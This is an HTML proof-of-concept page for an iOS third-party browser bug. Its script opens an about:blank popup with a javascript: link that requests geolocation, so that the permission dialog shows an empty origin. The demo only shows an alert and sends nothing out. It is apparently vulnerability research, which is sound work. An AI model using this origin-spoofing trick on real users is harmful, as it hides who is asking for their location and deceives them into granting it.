<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>PoC: Geolocation Origin Spoofing (iOS)</title>
    <style>
        body { font-family: -apple-system, sans-serif; padding: 20px; background: #f4f4f9; }
        .container { max-width: 500px; margin: auto; background: white; padding: 25px; border-radius: 15px; box-shadow: 0 5px 15px rgba(0,0,0,0.1); }
        h2 { color: #ff3b30; }
        .btn-main { 
            display: block; width: 100%; padding: 15px; background: #007aff; 
            color: white; border: none; border-radius: 10px; font-weight: bold; 
            font-size: 16px; cursor: pointer; text-align: center; text-decoration: none;
        }
    </style>
</head>
<body>

<div class="container">
    <h2>PoC: Geolocation Spoofing</h2>
    <p>This test targets the origin attribution bug in iOS third-party browsers.</p>
    
    <button class="btn-main" onclick="openVulnerablePopup()">1. Open Popup</button>

    <div id="instructions" style="margin-top: 20px; display: none; padding: 15px; background: #fff3cd; border-left: 5px solid #ffcc00;">
        <strong>Next Step:</strong> In the new window, click the red link to trigger the spoofed dialog.
    </div>
</div>

<script>
    function openVulnerablePopup() {
        const win = window.open("about:blank", "_blank", "width=500,height=500");
        document.getElementById('instructions').style.display = 'block';

        // The "Secret Sauce": Using javascript: protocol in an <a> tag
        const geoCode = "javascript:navigator.geolocation.getCurrentPosition(p => alert('Captured!'), e => alert('Denied/Error'));";

        const content = `
            <div style="font-family: -apple-system, sans-serif; padding: 50px; text-align: center;">
                <h3>Target: about:blank</h3>
                <p>Click the link below to trigger the vulnerability.</p>
                <a href="${geoCode}" style="
                    display: inline-block; padding: 20px; background: #ff3b30; 
                    color: white; text-decoration: none; border-radius: 10px; 
                    font-weight: bold;
                ">2. Trigger Geolocation</a>
                <p style="margin-top: 20px; color: #888; font-size: 12px;">
                    If vulnerable, the dialog will show EMPTY ORIGIN instead of your domain.
                </p>
            </div>
        `;

        win.document.write(content);
        win.document.close();
    }
</script>

</body>
</html>
